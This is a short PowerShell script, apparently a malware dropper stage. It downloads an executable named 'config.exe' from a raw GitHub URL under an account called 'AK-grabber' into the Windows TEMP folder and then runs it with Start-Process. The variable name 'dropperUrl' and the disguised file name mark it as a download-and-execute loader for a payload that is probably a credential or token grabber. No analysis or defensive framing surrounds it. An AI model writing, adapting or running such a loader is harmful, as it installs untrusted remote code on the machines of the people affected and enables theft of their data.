$dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/raw/refs/heads/main/config.exe"
$tempPath = "$env:TEMP\config.exe"
Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
Start-Process -FilePath $tempPath
